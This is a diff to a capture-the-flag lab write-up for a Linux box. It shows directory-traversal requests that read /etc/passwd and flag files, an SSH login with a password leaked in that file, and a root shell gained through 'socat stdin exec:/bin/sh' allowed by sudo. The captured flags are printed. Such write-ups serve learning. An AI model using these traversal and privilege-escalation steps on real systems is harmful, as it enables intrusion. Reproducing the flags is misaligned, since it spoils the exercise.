@@ -25,13 +25,17 @@ Nmap done: 1 IP address (1 host up) scanned in 35.84 seconds
 
 ```
 * We have a website on http
-* The site is running on linux
+* SSH is also open on port 22
+	* The site is running on linux
 
 
 # Exploitation
+* Here are two exploit paths: 
+	* The last exploit path make some references to things I did in the first one
+## 1. Guessing file paths
 * Clicking on "View details" on the homepage, we can see a url: `http://10.10.245.246/article?name=hacking`
 	* This looks like it's rendering some kind of file
-	* We can test for LFI by doing some directory traversal to look for the `/etc/passwd` file, which is universal on linux
+	* We can test for LFI (Local File Inclusion) by doing some directory traversal to look for the `/etc/passwd` file, which is universal on linux
 	* `http://10.10.245.246/article?name=../../../../../../etc/passwd` gives use their `/etc/passwd` file
 ```
 root:x:0:0:root:/root:/bin/bash
@@ -73,3 +77,24 @@ mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
 * `http://10.10.245.246/article?name=../../../../../../home/falconfeast/user.txt` gives us the user flag: `60989655118397345799`
 * `http://10.10.245.246/article?name=../../../../../../root/root.txt` gives us the root flag: `42964104845495153909`
 
+## 2. SSH into the box
+* If we look at the `/etc/passwd` file above, there's a line that says `#falconfeast:rootpassword`
+* So, if we run `ssh falconfeast@10.10.245.246` and put in the password `rootpassword` we get a shell
+* We can then `cat user.txt`
+* However, we are not root
+
+### privesc
+* Running `sudo -l` gets the following output:
+```
+Matching Defaults entries for falconfeast on inclusion:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User falconfeast may run the following commands on inclusion:
+    (root) NOPASSWD: /usr/bin/socat
+
+```
+* We can run socat as root without a password
+
+* In order to get a root shell, we can use the exec function of socat:
+	* `socat stdin exec:/bin/sh` gets us a root shell
+* We can `cat /root/root.txt`
